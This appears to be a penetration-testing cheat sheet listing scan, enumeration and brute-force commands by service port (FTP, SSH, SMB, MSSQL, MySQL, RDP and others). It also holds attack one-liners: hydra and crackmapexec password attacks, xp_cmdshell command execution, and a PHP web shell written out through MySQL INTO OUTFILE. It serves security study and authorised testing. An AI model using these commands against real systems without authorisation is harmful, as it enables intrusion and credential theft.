# Common Ports (Frequently seen)

## Manual Port Scan

### TCP

```
sudo nmap -sC -sV -oA nmap/intial <IP>
```
```
sudo nmap -sS -sC -sV -oA nmap/initial <IP>
```
```
sudo nmap -p- -oA nmap/all <IP>
```

### UDP

```
sudo nmap -sU -sC -sV -oA nmap/intialUdp <IP>
```
```
sudo nmap -sU -sS -sC -sV -oA nmap/initialUdp <IP>
```
## Auto Enumeration Tool(s) (General)

```
nmapAutomator <IP> All
```
```
autorecon <IP>/CIDR
```

## Banner Grabbing (General)

```
nc -nv <IP> <PORT>
```
```
telnet <IP> <PORT>
```

## FTP - Port 21

### Connect

```
ftp <IP> <PORT - (DEFAULT 21)>
```

### Brute Force

```
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ftp://<IP> -u -vV
```

### Download File

```
ftp> passive (if necessary)
ftp> binary (if necessary)
ftp> get <FILE>
```

### Upload File

```
ftp> passive (if necessary)
ftp> binary (if necessary)
ftp> put <FILE>
```

## SSH - Port 22

### Connect

```
ssh <USER>@<IP> <PORT - (DEFAULT - 22)>
```
```
ssh -i key.txt <USER>@<IP> <PORT - (DEFAULT -22)>
```

### Brute Force

```
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ssh://<IP> -u -vV
```

## DNS - Port 53

### Basic Enum

```
dnsenum <DOMAIN>
```
```
dnsrecon -d <DOMAIN>
```

### Zone Transfer

```
dnsrecon -d <DOMAIN> -a
dig axfr <DOMAIN> @ns1.test.com
```

### Brute Force

```
https://github.com/blark/aiodnsbrute
```

## HTTP/HTTPS - Port 80/443

### Auto Scan

```
nikto -h <URL>
```

### Brute Force Directories

```
gobuster dir -u <URL> -w <PATH-TO-WORDLIST> -x <FILE-EXTENSIONS>
```

### WordPress

```
wpscan --url <URL>
```

### Drupal

```
droopescan scan -u <URL>
```

### Joomla

```
joomscan -u <URL>
```

### WebDav

```
davtest -url <URL>
```

### Command Injection 

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
```

### File Upload

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
```

### SQL Injection

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
```

#### General SQL Cheatsheets

```
https://www.exploit-db.com/papers/12975

https://bhanusnotes.blogspot.com/2019/09/sql-injection-cheat-sheet.html
```

#### Error - Based SQL Cheatsheet

```
https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
```

## POP3 - Port 110

### Brute Force

```
hydra -l <USER> -P <PASSWORDS_LIST> -f <IP> pop3 -V
hydra -S -v -l <USER> -P <PASSWORDS_LIST> -s 995 -f <IP> pop3 -V
```

### Read Mail

```
telnet <IP> <PORT>  # Port should be 110 as default

USER <USER>
PASS <PASSWORD>
LIST
RETR <MAIL#>
QUIT
```

## SNMP - Port 161

### Brute Force Community Strings

```
onesixtyone -c /home/kali/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <IP>
```
```
snmpbulkwalk -c <COMMUNITY_STRING> -v<VERSION> <IP>
```
```
snmp-check <IP>
```
```
http://net-snmp.sourceforge.net/tutorial/tutorial-5/commands/snmpset.html
```

## SMB - Port 445

### Scan for Vulnerabilities

```
nmap -p139,445 --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 <IP>
```
```
nmap --script smb-vuln* -p 139,445 <IP>
```
### Auto Scans

```
sudo nbtscan -r <IP>
```
```
enum4linux -a <IP>
```

### Manual Enumeration

```
smbmap -H <IP>
smbmap -u '' -p '' -H <IP>
smbmap -u 'guest' -p '' -H <IP>
smbmap -u '' -p '' -H <IP> -R
smbmap -H <IP> -d <DOMAIN> -u <USER> -p <PASSWORD>

crackmapexec smb <IP>
crackmapexec smb <IP> -u '' -p ''
crackmapexec smb <IP> -u 'guest' -p ''
crackmapexec smb <IP> -u '' -p '' --shares

smbclient -L \\<IP>
echo exit | smbclient -L \\\\<IP>   # exit will take care of any password popups
smbclient \\\\<IP>\\<SHARE_NAME>    # attempt to connect to the share
```
```
####################################
FOR SAMBA: (grab the version number)
####################################

ERROR: protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED

DO:
/etc/samba/smb.conf and add one line to the global section:
client min protocol = LANMAN1

1st console: sudo ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]' port 139
2nd console: echo exit | smbclient -L [Target IP]

github script which does something similar (MAKE SURE TO CHANGE IPS AND TUN0): https://github.com/rewardone/OSCPRepo/blob/master/scripts/recon_enum/smbver.sh
```

### Brute Force

```
crackmapexec smb <IP> -u <USER_LIST> -p <PASSWORD_LIST>
```

### Mount SMB Share

```
mkdir /tmp/share
sudo mount -t cifs //<IP>/<SHARE> /tmp/share
sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>'//<IP>/<SHARE> /tmp/share

smbclient //<IP>/<SHARE>
smbclient //<IP>/<SHARE> -U <USER>
```

### MySQL - SQL injection

- connect to sql database

```
$ sqsh -S <server ip> -U <username> -P <password>
```

- General SQL cheatsheets

```
https://www.exploit-db.com/papers/12975

https://bhanusnotes.blogspot.com/2019/09/sql-injection-cheat-sheet.html

```

- error based SQL cheatsheet

```
https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
```

## MSSQL - Port 1433

### Brute Force

```
hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mssql -vV -I -u
```

### Connect

```
sqsh -S <IP> -U <USERNAME> -P <PASSWORD>
```

### RCE (Need SQL Admin)

```
xp_cmdshell '<CMD>';
```

## NFS - Port 2049

### Enum NFS Shares

```
showmount -e <IP>
nmap --script=nfs-showmount -oN NFS_shares <IP>
```

### Mount Shares

```
sudo mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
sudo mount -v -t nfs -o vers=2 <IP>:<SHARE> <DIRECTORY>
```

## MYSQL - Port 3306

### Connect

```
mysql -u <USERNAME>
mysql -u <USERNAME> -p
```
```
mysql -h <IP> -u <USERNAME>
```

### Basic Commands

```
show databases;
use <DATABASES>;

show tables;
describe <TABLE>;

select * from <TABLE>;

select do_system('whoami);
\! sh

select load_file('<FILE>');
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '<OUT_FILE>'
```

## RDP - Port 3389

### Connect

```
rdesktop -u <USERNAME> <IP>
rdesktop -d <DOMAIN> -u <USERNAME> -p <PASSWORD> <IP>
```

### Brute Force

```
ncrack -vv --user offsec -P passwords rdp://10.10.10.10
```
